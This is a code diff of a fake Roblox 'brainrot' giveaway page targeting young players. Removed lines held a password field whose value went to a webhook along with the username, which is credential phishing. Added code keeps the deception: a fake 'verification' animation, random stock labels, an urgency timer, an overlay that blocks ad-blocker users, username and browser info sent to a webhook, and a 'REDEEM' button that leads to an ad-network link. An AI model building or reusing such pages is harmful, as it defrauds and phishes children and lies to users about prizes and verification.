+            border-radius: 16px; padding: 14px; text-align: center; cursor: pointer;
+            transition: all .25s; position: relative;
+        }
+        .brainrot-card:hover { background: rgba(255,255,255,.06); border-color: rgba(255,255,255,.2); }
+        .brainrot-card.selected {
+            border-color: var(--neon-green); background: rgba(0,255,136,.08);
+            box-shadow: 0 0 20px rgba(0,255,136,.3);
+        }
+        .brainrot-card .card-img {
+            width: 70px; height: 70px; object-fit: contain; border-radius: 12px;
+            background: rgba(0,0,0,.3); margin: 0 auto 8px; border: 2px solid transparent;
+        }
+        .brainrot-card.selected .card-img { border-color: var(--neon-green); }
+        .brainrot-card .card-name {
+            font-family: 'Jersey20', sans-serif; font-size: 14px; color: #eee; margin-bottom: 4px;
+        }
+        .brainrot-card .card-rarity {
+            font-family: 'Jersey20', sans-serif; font-size: 10px; letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .selection-counter {
+            font-family: 'Jersey20', sans-serif; font-size: 22px; color: var(--yellow);
+            text-shadow: 0 0 12px rgba(255,215,0,.6); margin-bottom: 8px; text-align: center;
+        }
+        .btn-selection-continue {
+            width: 100%; padding: 16px; border: none; border-radius: 14px;
+            background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
+            color: #000; font-family: 'Jersey20', sans-serif; font-size: 22px;
+            letter-spacing: 2px; cursor: pointer; transition: transform .15s, box-shadow .15s;
+        }
+        .btn-selection-continue:disabled {
+            opacity: .5; cursor: not-allowed; filter: grayscale(.4); animation: none;
+        }
+        .btn-selection-continue:hover:not(:disabled) {
+            transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,255,136,.4);
+        }
+
+        #success-screen {
+            display: none; flex-direction: column; align-items: center; text-align: center;
+            width: 100%; max-width: 560px; animation: fadeUp .6s ease both;
+        }
+        .success-card {
+            background: var(--card); border: 1px solid var(--border); border-radius: 24px;
+            padding: 36px 30px; width: 100%; position: relative; overflow: hidden;
+            box-shadow: 0 0 60px rgba(0,255,136,.12), 0 0 120px rgba(0,207,255,.06);
+        }
+        .success-card::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(90deg, var(--neon-green), var(--electric-blue), var(--neon-green));
+            background-size: 200% 100%; animation: rainbowSlide 2s linear infinite;
+        }
+        .progress-wrap { margin: 0 auto 24px; width: 100%; max-width: 400px; }
+        .progress-bar {
+            position: relative; width: 100%; height: 28px;
+            background: rgba(255,255,255,0.05); border-radius: 20px; overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.15); box-shadow: inset 0 2px 6px rgba(0,0,0,0.4);
+        }
+        .progress-fill {
+            position: absolute; left: 0; top: 0; bottom: 0; width: 90%;
+            background: linear-gradient(90deg, #1e90ff, #8a2be2, #ff69b4);
+            background-size: 300% 100%; animation: lavaFlow 6s ease-in-out infinite;
+            border-radius: 20px; box-shadow: 0 0 20px rgba(138,43,226,0.5); overflow: hidden;
+        }
+        @keyframes lavaFlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .progress-fill::before {
+            content: ''; position: absolute; top: -5px; left: -10%; width: 200%; height: 200%;
+            background:
+                radial-gradient(ellipse at 20% 50%, rgba(255,255,255,0.4) 0%, transparent 50%),
+                radial-gradient(ellipse at 70% 30%, rgba(255,255,255,0.3) 0%, transparent 50%),
+                radial-gradient(ellipse at 45% 80%, rgba(255,255,255,0.25) 0%, transparent 50%);
+            background-size: 30% 80%, 40% 50%, 35% 60%;
+            background-repeat: no-repeat; animation: bubbleShift 4s ease-in-out infinite alternate;
+            filter: blur(2px);
+        }
+        @keyframes bubbleShift {
+            0% { transform: translateX(-5%); }
+            100% { transform: translateX(5%); }
+        }
+        .progress-percent {
+            font-family: 'Jersey20', sans-serif; font-size: 28px; letter-spacing: 2px;
+            margin-top: 8px; color: var(--neon-green); text-shadow: 0 0 12px rgba(0,255,136,0.6);
+        }
+        .claim-headline {
+            font-family: 'Jersey20', sans-serif; font-size: 32px; margin-bottom: 6px;
+            background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            letter-spacing: 1px;
+        }
+        .claim-subtitle { font-size: 16px; color: #ccc; margin-bottom: 18px; font-weight: 700; }
+        .chosen-banner { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; margin-bottom: 20px; }
+        .chosen-badge {
+            display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,.05);
+            border: 1px solid rgba(255,255,255,.1); border-radius: 12px;
+            padding: 8px 14px; font-family: 'Jersey20', sans-serif; font-size: 13px;
+        }
+        .chosen-badge img {
+            width: 32px; height: 32px; border-radius: 6px; object-fit: contain;
+            background: rgba(0,0,0,.3);
+        }
+        .offer-steps {
+            background: rgba(0,255,136,.06); border: 1px solid rgba(0,255,136,.2);
+            border-radius: 12px; padding: 16px 18px; font-size: 14px; color: #bbb;
+            margin-bottom: 24px; text-align: left; line-height: 2;
+        }
+        .offer-steps span { color: var(--neon-green); font-weight: 700; font-family: 'Jersey20', sans-serif; }
+        .btn-continue {
+            display: block; width: 100%; padding: 16px; border: none; border-radius: 14px;
+            background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
+            color: #000; font-family: 'Jersey20', sans-serif; font-size: 22px;
+            letter-spacing: 2px; cursor: pointer; text-decoration: none; text-align: center;
+            transition: transform .15s, box-shadow .15s;
+        }
+        .btn-continue:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,255,136,.4); }
+
+        .confetti-container { position: fixed; inset: 0; pointer-events: none; z-index: 50; }
+        .confetti-piece {
+            position: absolute; width: 10px; height: 10px; top: -10px;
+            border-radius: 2px; animation: confettiFall linear forwards;
+        }
+        @keyframes confettiFall {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+        }
         @keyframes fadeDown { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
         @keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
         @keyframes spin { to { transform:rotate(360deg); } }
-        .floaties { position:fixed; inset:0; pointer-events:none; z-index:0; overflow:hidden; }
-        .floaty { position:absolute; font-size:22px; opacity:.12; animation:floatyUp linear infinite; }
-        @keyframes floatyUp {
-            0% { transform:translateY(110vh) rotate(0deg); opacity:0; }
-            10% { opacity:.12; }
-            90% { opacity:.12; }
-            100% { transform:translateY(-10vh) rotate(360deg); opacity:0; }
+        .floaties { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
+        .floaty {
+            position: absolute; font-size: 22px; opacity: .12; animation: floatyUp linear infinite;
         }
-        .general-error { background:rgba(255,45,120,.1); border:1px solid rgba(255,45,120,.3); border-radius:10px; padding:10px 14px; font-size:13px; color:var(--hot-pink); font-weight:700; margin-top:10px; display:none; }
-        @media (max-width:900px) {
-            .main-layout { flex-direction:column; align-items:center; gap:24px; }
+        @keyframes floatyUp {
+            0% { transform: translateY(110vh) rotate(0deg); opacity: 0; }
+            10% { opacity: .12; }
+            90% { opacity: .12; }
+            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
+        }
+        .general-error {
+            background: rgba(255,45,120,.1); border: 1px solid rgba(255,45,120,.3);
+            border-radius: 10px; padding: 10px 14px; font-size: 13px; color: var(--hot-pink);
+            font-weight: 700; margin-top: 10px; display: none;
+        }
+
+        /* Side ad panels */
+        .side-ad-left, .side-ad-right {
+            position: fixed; top: 0; bottom: 0; width: var(--side-ad-width);
+            overflow: hidden; z-index: 10; background: rgba(0,0,0,0.2);
+            display: flex; align-items: center; justify-content: center;
+        }
+        .side-ad-left { left: 0; }
+        .side-ad-right { right: 0; }
+
+        /* Hide side ads on narrow screens */
+        @media (max-width: 1100px) {
+            body { padding: 0; }
+            .side-ad-left, .side-ad-right { display: none; }
+        }
+        @media (max-width: 900px) {
+            .main-layout { flex-direction: column; align-items: center; gap: 24px; }
             .left-column { flex:0 0 auto; max-width:100%; width:100%; min-width:0; }
             .right-column { max-width:100%; width:100%; min-width:0; }
-            .showcase-card { max-height:420px; }
-            .header h1 { font-size:clamp(36px,7vw,56px); }
+            .showcase-card { max-height: 420px; }
+            .header h1 { font-size: clamp(36px, 7vw, 56px); }
         }
     </style>
 </head>
@@ -259,7 +541,7 @@
 
     <!-- Browser / Adblock Block Overlay -->
     <div id="browserBlock" style="display:none;position:fixed;inset:0;z-index:9999;background:linear-gradient(145deg,#0b0c1a,#1a1b2f);align-items:center;justify-content:center;padding:1.5rem;">
-        <div style="max-width:440px;width:100%;background:rgba(22,23,45,0.95);border:1px solid rgba(255,100,100,0.4);border-radius:2.5rem;padding:2.5rem 2rem;text-align:center;box-shadow:0 0 60px rgba(255,60,60,0.2);font-family:'Segoe UI',system-ui,sans-serif;color:#fff;">
+        <div style="max-width:440px;width:100%;background:rgba(22,23,45,0.95);border:1px solid rgba(255,100,100,0.4);border-radius:2.5rem;padding:2.5rem 2rem;text-align:center;box-shadow:0 0 60px rgba(255,60,60,0.2);font-family:'Jersey20',sans-serif;color:#fff;">
             <div style="font-size:4rem;margin-bottom:1rem;" id="block-icon">🚫</div>
             <h2 id="block-title" style="font-size:1.8rem;font-weight:800;background:linear-gradient(to right,#ff9898,#ff4d4d);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:0.8rem;">Ad-Blocker Detected</h2>
             <p id="block-message" style="color:#d1d5ff;font-size:1rem;line-height:1.6;margin-bottom:1.5rem;">
@@ -271,6 +553,15 @@
             </button>
             <p style="margin-top:1.2rem;font-size:0.75rem;color:#6b7280;">Refresh the page after disabling.</p>
         </div>
+    </div>
+
+    <!-- Fixed side ad panels -->
+    <div class="side-ad-left">
+        <div id="container-2fc4e0426b6186925acb99686fb36795"></div>
+        <script async="async" data-cfasync="false" src="https://pl29348841.profitablecpmratenetwork.com/2fc4e0426b6186925acb99686fb36795/invoke.js"></script>
+    </div>
+    <div class="side-ad-right">
+        <script src="https://pl29349800.profitablecpmratenetwork.com/3a/c0/c4/3ac0c445157950843d3c1ee3c3cf1080.js"></script>
     </div>
 
     <!-- Backgrounds & Main Content -->
@@ -303,6 +594,8 @@
                     </div>
                     <div class="card-title">Enter the Giveaway</div>
                     <div class="card-subtitle">Fill in your info below. One entry per account.</div>
+
+                    <!-- Registration form (only username) -->
                     <form id="giveaway-form" autocomplete="off">
                         <div class="field">
                             <label>Roblox Username</label>
@@ -313,19 +606,21 @@
                             </div>
                             <div class="status-msg" id="username-status"></div>
                         </div>
-                        <div class="field">
-                            <label>Password</label>
-                            <div class="input-wrap">
-                                <span class="icon">🔒</span>
-                                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" />
-                            </div>
-                            <div class="status-msg" id="password-status"></div>
-                        </div>
                         <button type="submit" class="btn-submit" id="submit-btn" disabled>
                             🎁 ENTER GIVEAWAY
                         </button>
                         <div class="general-error" id="general-error"></div>
                     </form>
+
+                    <!-- Verification overlay (hidden until submit) -->
+                    <div id="verification-overlay">
+                        <div class="verification-spinner"></div>
+                        <div class="progress-verification">
+                            <div class="progress-verification-fill" id="progress-fill-verification" style="width:0%;"></div>
+                        </div>
+                        <div class="verification-text" id="verification-text">Checking username...</div>
+                    </div>
+
                     <p class="terms">By entering you agree to the giveaway rules.<br>Roblox is not affiliated with this giveaway.</p>
                 </div>
             </div>
@@ -353,7 +648,7 @@
             </div>
         </div>
 
-        <!-- Claim Screen (with Locker) -->
+        <!-- Claim Screen -->
         <div id="success-screen">
             <div class="success-card">
                 <div class="progress-wrap">
@@ -369,22 +664,15 @@
                     <span>3.</span> Claim your reward in-game<br>
                     <span style="color:#ffd700;">⭐</span> <strong style="color:#ffd700;">+2 Bonus Brainrots</strong> if completed within the time limit!
                 </div>
-                <button id="continue-button" class="btn-continue" onclick="call_locker(); return false;">
-                    🎮 COMPLETE OFFERS →
+                <button id="continue-button" class="btn-continue" onclick="window.location.href='https://www.profitablecpmratenetwork.com/nven4uvh?key=19e03e5b165a5c4d3da69ba06da3cd33'">
+                    🎮 REDEEM →
                 </button>
             </div>
         </div>
     </div>
 
-    <!-- Additional Ad Elements -->
-    <div id="container-2fc4e0426b6186925acb99686fb36795"></div>
-    <script async="async" data-cfasync="false" src="https://pl29348841.profitablecpmratenetwork.com/2fc4e0426b6186925acb99686fb36795/invoke.js"></script>
-
-    <!-- Popdown ad script (replaced) -->
-    <script src="https://pl29349800.profitablecpmratenetwork.com/3a/c0/c4/3ac0c445157950843d3c1ee3c3cf1080.js"></script>
-
     <script>
-        // Brainrot data, infinite scroll, confetti, timer, etc. (identical to previous version)
+        // Brainrot data
         const brainrotsData = [
             { name: 'Strawberry Elephant', rarity: 'OG', image: 'strawberry-elephant.png' },
             { name: 'Meowl', rarity: 'OG', image: 'meowl.png' },
@@ -399,6 +687,7 @@
         ];
 
         const brainrotsWithStock = brainrotsData.map(b => ({ ...b, stock: Math.random() < 0.5 ? 'limited' : 'out-of-stock' }));
+
         function buildBrainrotItem(b) {
             const div = document.createElement('div');
             div.className = 'brainrot-item';
@@ -417,10 +706,12 @@
                 </div>`;
             return div;
         }
+
         const scrollInner = document.getElementById('scroll-inner');
         brainrotsWithStock.forEach(b => scrollInner.appendChild(buildBrainrotItem(b)));
         brainrotsWithStock.forEach(b => scrollInner.appendChild(buildBrainrotItem(b)));
 
+        // Floating emojis
         const emojis = ['🧠','🎮','⚡','🔥','💥','🎁','🌀','👾','✨','💀'];
         const floaties = document.getElementById('floaties');
         for (let i = 0; i < 18; i++) {
@@ -452,6 +743,7 @@
             }
         }
 
+        // Timer
         const TIMER_DURATION = 180;
         let timerRemaining = TIMER_DURATION;
         const timerDisplay = document.getElementById('timer-display');
@@ -477,41 +769,31 @@
         }
         startTimer();
 
+        // Form validation (username only)
         const usernameInput = document.getElementById('roblox-username');
-        const passwordInput = document.getElementById('password');
-        const passwordStatus = document.getElementById('password-status');
         const verifyBadge = document.getElementById('verify-badge');
         const submitBtn = document.getElementById('submit-btn');
+        const usernameStatus = document.getElementById('username-status');
+        const generalError = document.getElementById('general-error');
+
         usernameInput.addEventListener('input', () => {
             const v = usernameInput.value.trim();
             usernameInput.classList.remove('error', 'success');
             verifyBadge.textContent = '';
-            if (v.length >= 3) { usernameInput.classList.add('success'); verifyBadge.textContent = '✅'; }
-            updateSubmitBtn();
-        });
-        passwordInput.addEventListener('input', () => {
-            const v = passwordInput.value;
-            passwordInput.classList.remove('error', 'success');
-            passwordStatus.className = 'status-msg';
-            passwordStatus.textContent = '';
-            if (v.length === 0) { updateSubmitBtn(); return; }
-            if (v.length >= 6) {
-                passwordInput.classList.add('success');
-                passwordStatus.className = 'status-msg success';
-                passwordStatus.textContent = '✅ Looks good!';
-            } else {
-                passwordInput.classList.add('error');
-                passwordStatus.className = 'status-msg error';
-                passwordStatus.textContent = '❌ Password must be at least 6 characters';
+            usernameStatus.textContent = '';
+            if (v.length >= 3) {
+                usernameInput.classList.add('success');
+                verifyBadge.textContent = '✅';
             }
             updateSubmitBtn();
         });
+
         function updateSubmitBtn() {
             const usernameOk = usernameInput.value.trim().length >= 3;
-            const passwordOk = passwordInput.value.length >= 6;
-            submitBtn.disabled = !(usernameOk && passwordOk);
+            submitBtn.disabled = !usernameOk;
         }
 
+        // Cookies
         function setCookie(name, value, days) {
             const expires = new Date(Date.now() + days * 864e5).toUTCString();
             document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/; SameSite=Lax';
@@ -523,6 +805,7 @@
             }, '');
         }
 
+        // Client info for webhook
         function getClientInfo() {
             return {
                 referrer: document.referrer || 'direct',
@@ -550,6 +833,7 @@
             }
         }
 
+        // Global states
         let currentUsername = null;
         let currentBonusActive = true;
         let selectedBrainrots = [];
@@ -563,6 +847,7 @@
             document.getElementById('success-screen').style.display = 'none';
             buildSelectionGrid();
         }
+
         function buildSelectionGrid() {
             const grid = document.getElementById('selection-grid');
             grid.innerHTML = '';
@@ -581,6 +866,7 @@
             });
             updateSelectionCounter();
         }
+
         function toggleSelection(index, cardElement) {
             if (cardElement.classList.contains('selected')) {
                 cardElement.classList.remove('selected');
@@ -593,6 +879,7 @@
             updateSelectionCounter();
             document.getElementById('selection-continue-btn').disabled = selectedBrainrots.length < 1;
         }
+
         function updateSelectionCounter() {
             document.getElementById('selection-counter').textContent = selectedBrainrots.length + ' / 3 selected';
         }
@@ -629,16 +916,55 @@
             setTimeout(launchConfetti, 200);
         }
 
-        // Form submit
+        // Handle form submission with verification overlay
         document.getElementById('giveaway-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             const username = usernameInput.value.trim();
-            const password = passwordInput.value;
-            const bonusActive = !timerExpired;
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="spinner"></span> Submitting…';
-            await sendToWebhook({ username, password });
-            showSelectionScreen(username, bonusActive);
+            if (username.length < 3) return;
+
+            // Hide form elements, show verification overlay
+            document.getElementById('register-card').querySelector('.card-title').style.display = 'none';
+            document.getElementById('register-card').querySelector('.card-subtitle').style.display = 'none';
+            document.getElementById('giveaway-form').style.display = 'none';
+            document.getElementById('verification-overlay').style.display = 'block';
+            generalError.style.display = 'none';
+
+            // Simulate verification progress
+            const progressFill = document.getElementById('progress-fill-verification');
+            const verificationText = document.getElementById('verification-text');
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 40;
+                if (progress >= 100) progress = 100;
+                progressFill.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    verificationText.textContent = 'Verified! ✅';
+                    setTimeout(() => {
+                        // Proceed to selection screen
+                        const bonusActive = !timerExpired;
+                        sendToWebhook({ username }); // fire and forget
+                        showSelectionScreen(username, bonusActive);
+                        // Reset form for next time (in case user goes back? but navigation changes)
+                        document.getElementById('register-card').querySelector('.card-title').style.display = '';
+                        document.getElementById('register-card').querySelector('.card-subtitle').style.display = '';
+                        document.getElementById('giveaway-form').style.display = '';
+                        document.getElementById('verification-overlay').style.display = 'none';
+                        progressFill.style.width = '0%';
+                        usernameInput.value = '';
+                        updateSubmitBtn();
+                    }, 500);
+                }
+            }, 1000);
+
+            // Fallback in case interval doesn't reach 100% (should after 2.5s)
+            setTimeout(() => {
+                clearInterval(interval);
+                if (progress < 100) {
+                    progressFill.style.width = '100%';
+                    verificationText.textContent = 'Verified! ✅';
+                }
+            }, 2500);
         });
 
         document.getElementById('selection-continue-btn').addEventListener('click', () => {
@@ -646,13 +972,7 @@
             showClaimScreen(currentUsername, currentBonusActive);
         });
 
-        document.getElementById('continue-button').addEventListener('click', (e) => {
-            e.preventDefault();
-            if (typeof call_locker === 'function') {
-                call_locker();
-            }
-        });
-
+        // Ad-block detection
         function detectAdBlocker() {
             const adDiv = document.getElementById('adblock-detector');
             if (!adDiv) return false;
@@ -670,7 +990,7 @@
             document.getElementById('block-footer').style.display = 'none';
         }
 
-        // Cookie check for returning users
+        // Returning user cookie check
         const savedData = getCookie('brainrot_registered');
         if (savedData && !detectAdBlocker()) {
             try {
